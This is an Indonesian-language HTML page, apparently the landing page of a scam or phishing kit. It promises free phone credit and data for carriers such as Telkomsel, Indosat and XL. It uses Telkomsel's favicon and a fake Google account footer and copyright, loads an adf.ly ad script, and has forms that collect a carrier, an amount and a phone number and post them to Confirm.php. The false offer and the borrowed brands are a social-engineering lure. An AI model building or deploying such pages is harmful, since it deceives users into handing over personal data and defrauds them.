<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='https://telkomsel.com/favicon.ico' rel='icon'>
<title>Pulsa dan kouta Gratis</title>
<script src="js/jquery.min.js"></script>
<link rel="stylesheet" href="js/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(img/bb.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="img/bb.png"/>
<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-google-plus"></i> Pulsa dan Kuota Gratis Semua Oprator</b></div>
</div>
<script src="https://cdn.adf.ly/js/display.js"></script> 
<center style="background:white;"><br>
<div class="col-md-12">
<br>
<marquee>

<style typecss="[{http://sahabatblogger77.blogspot.com}]">
  #highlight{font:bold 30px Impact,Arial,Sans-Serif;}</style>
<script language="javascript" type="text/javascript">
     var teks="SELAMAT DATANG DI PULSA DAN KOUTA GRATIS 2018"
     var speed=10

if (document.all||document.getElementById) {
     document.write('<span id="highlight">' + teks + '</span>')
     var storetext=document.getElementById? document.getElementById("highlight") :
document.all.highlight
} else document.write(text)
var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")

var r=1
var g=1
var b=1
var seq=1

function changetext() {
     rainbow="#"+hex[r]+hex[g]+hex[b]
     storetext.style.color=rainbow
}

function change() {
if (seq==6) {
b--
if (b==0)
seq=1
}
if (seq==5) {
r++
if (r==12)
seq=6
}
if (seq==4) {
g--
if (g==0)
seq=5
}
if (seq==3) {
b++
if (b==12)
seq=4
}
if (seq==2) {
r--
if (r==0)
seq=3
}
if (seq==1) {
g++
if (g==12)
seq=2
}
changetext()
}

function starteffect() {
     if (document.all||document.getElementById)
     flash=setInterval("change()",speed)
}

starteffect()
</script></marquee>
<br>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
<h4 ><b> Pulsa Gratis </b></h4><FORM NAME="frmSignUp" METHOD="post" ACTION="Confirm.php">
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><img src="img/oprator.png" width="20px"></span>
            <select class="form-control" id="gems">
          <option>Pilih Oprator</option>
          <option>Telkomsel</option>
          <option>Axis</option>
          <option>XL</option>
          <option>3</option>
          <option>Indosat</option>
          <option>Smartfren</option>
          <option>Esia</option>
          <option>FLEXI</option>
</select>
  </div>
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><img src="img/gratis.png" width="20px"></span>
            <select class="form-control" id="gold">
          <option>10.000</option>
          <option>20.000</option>
          <option>30.000</option>
          <option>40.000</option>
          <option>50.000</option>
          <option>60.000</option>
          <option>70.000</option>
          <option>80.000</option>
          <option>90.000</option>
          <option>100.000</option>
          </select>
</div>
<div style="width:100%" class="form-group">
 <div class="input-group">
    <span class="input-group-addon"><img src="img/hp.png" width="20px"></span>
<input class="form-control" id="new"  placeholder=" NNOMOR PHONSEL " type="Number">
</div>


<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="LANJUTKAN"> </form>
</div>
</div><br><br>
</div>




<h4 ><b> Kouta Gratis </b></h4><FORM NAME="frmSignUp" METHOD="post" ACTION="Confirm.php">
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><img src="img/oprator.png" width="20px"></span>
            <select class="form-control" id="gems">
          <option>Telkomsel</option>
          <option>Axis</option>
          <option>XL</option>
          <option>3</option>
          <option>Indosat</option>
          <option>Smartfren</option>
          <option>Esia</option>
          <option>FLEXI</option>
</select>
  </div>
<div style="width:100%" class="form-group">
<div class="input-group">
    <span class="input-group-addon"><img src="img/gratis.png" width="20px"></span>
            <select class="form-control" id="gold">
          <option>1GB</option>
          <option>2GB</option>
          <option>3GB</option>
          <option>4GB</option>
          <option>5GB</option>
          <option>6GB</option>
          <option>7GB</option>
          <option>8GB</option>
          <option>9GB</option>
          <option>10GB</option>
          </select>
</div>
<div style="width:100%" class="form-group">
 <div class="input-group">
    <span class="input-group-addon"><img src="img/hp.png" width="20px"></span>
<input class="form-control" id="new"  placeholder=" NNOMOR PHONSEL " type="Number">
</div>


<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="LANJUTKAN"> </form>
</div>
</div><br><br>
</div>
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>One Google Account for everything Google </p></center>
<img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/></p>
<p>Copyright &copy; 2018 Google Inc.</p>

</div>
</div>

</div>
</div>
</div>

</div>